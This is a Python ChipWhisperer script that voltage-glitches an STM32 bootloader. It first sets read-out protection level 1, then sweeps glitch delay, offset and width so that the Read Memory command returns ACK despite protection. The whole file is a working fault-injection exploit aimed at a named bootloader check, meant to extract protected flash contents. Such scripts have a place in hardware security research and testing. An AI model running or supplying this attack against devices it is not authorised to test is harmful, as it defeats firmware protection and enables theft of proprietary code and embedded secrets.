import chipwhisperer as cw
import time

CW_SERIAL = "442031204c5032433130333234313031"

# From your last measurement with 0x11/0xEE under RDP0:
PER_BYTE_S = 0.002604              # 2.604 ms per byte
BASE_DELAY_S = PER_BYTE_S * 2.5    # about 2.5 bytes after command start
BASE_DELAY_US = int(BASE_DELAY_S * 1_000_000 + 0.5)

scope = None
target = None
stm32 = None


def connect():
    global scope, target, stm32

    print("[*] Connecting to CW-Lite...")
    scope = cw.scope(sn=CW_SERIAL)
    scope.default_setup()

    target = cw.target(scope)

    prog = cw.programmers.STM32FProgrammer()
    prog.scope = scope
    stm32 = prog.stm32prog()
    stm32.scope = scope

    # Voltage glitch setup (helper for CW-Lite)
    scope.vglitch_setup("lp")          # config HP/LP MOSFETs, clkgen, glitch_only, etc.
    scope.glitch.trigger_src = "manual"
    scope.glitch.clk_src     = "clkgen"
    scope.glitch.repeat      = 1       # single pulse

    print("[*] Glitch configured (manual trigger, clkgen source).")


def enter_bootloader():
    """BOOT0=1 + 0x7F/0x79 sync."""
    stm32.set_boot(True)
    stm32.reset()
    stm32.open_port(baud=9600)
    target.flush()

    target.write('\x7F')
    resp = target.read(1)
    if resp != '\x79':
        raise RuntimeError(f"Bootloader sync failed, got {repr(resp)}")


def enable_rdp1():
    """Enable RDP1 once (0x82 + 0x7D)."""
    print("[*] Enabling RDP1...")
    target.write('\x82')
    target.write('\x7D')
    ack1 = target.read(1)
    ack2 = target.read(1)
    print("    RDP enable ACKs:", repr(ack1), repr(ack2))
    time.sleep(0.1)  # chip resets


def try_glitch_once(delay_us, ext_offset, width):
    """
    One glitch attempt.

    We:
      - enter bootloader (RDP1 already active)
      - send 0x11 0xEE
      - wait 'delay_us' (coarse)
      - fire glitch (ext_offset + width)
      - read next byte

    Under RDP1, this byte should normally be NACK 0x1F (or nothing).
    If we see ACK 0x79, we likely glitched the RDP check in
    FUN_1ffff520_read_memory_get_address().
    """
    scope.glitch.ext_offset = ext_offset
    scope.glitch.width      = width

    enter_bootloader()

    # Send Read Memory command (0x11 + complement 0xEE)
    target.write('\x11')
    target.write('\xEE')

    # COARSE delay based on your measured per-byte time
    time.sleep(delay_us / 1_000_000.0)

    # FINE delay via ext_offset inside the glitch block
    scope.glitch.manual_trigger()

    # First response after the command: ACK vs NACK
    resp = target.read(1)

    if resp == '\x79':
        print(f"    >>> GOT ACK 0x79 under RDP1! "
              f"delay={delay_us}us ext_offset={ext_offset} width={width}")
        return True

    print(f"    got {repr(resp)} (normal under RDP1).")
    return False


def main():
    connect()

    print(f"[*] Using per-byte ≈ {PER_BYTE_S*1000:.3f} ms")
    print(f"[*] Base delay ≈ {BASE_DELAY_US} µs (~2.5 bytes after sending 0x11/0xEE)")

    # Put chip into bootloader, then enable RDP1 once
    enter_bootloader()
    enable_rdp1()
    print("[*] RDP1 active. Starting calibrated glitch sweep...")

    found = False

    # Sweep delays around the ~6.5 ms base:
    # from 3.0 ms to 10.0 ms, step 0.25 ms
    DELAY_US_RANGE   = range(3000, 10000, 250)

    # Fine timing + width
    EXT_OFFSET_RANGE = range(0, 200, 20)
    WIDTH_VALUES     = [3, 5, 7, 9]

    ATTEMPTS_PER_SETTING = 3

    for delay_us in DELAY_US_RANGE:
        for ext in EXT_OFFSET_RANGE:
            for width in WIDTH_VALUES:
                print(f"\n[*] delay={delay_us}us ext_offset={ext} width={width}")
                for attempt in range(ATTEMPTS_PER_SETTING):
                    print(f"    attempt {attempt + 1}")
                    try:
                        if try_glitch_once(delay_us, ext, width):
                            print("\n[***] SUCCESS CANDIDATE ***")
                            print(f"      delay_us   = {delay_us}")
                            print(f"      ext_offset = {ext}")
                            print(f"      width      = {width}")
                            found = True
                            break
                    except Exception as e:
                        print("    Error:", e)
                        time.sleep(0.05)
                if found:
                    break
            if found:
                break
        if found:
            break

    if not found:
        print("\n[!] No success in this calibrated range.")
        print("    You can widen DELAY_US_RANGE around BASE_DELAY_US if needed.")


if __name__ == "__main__":
    main()
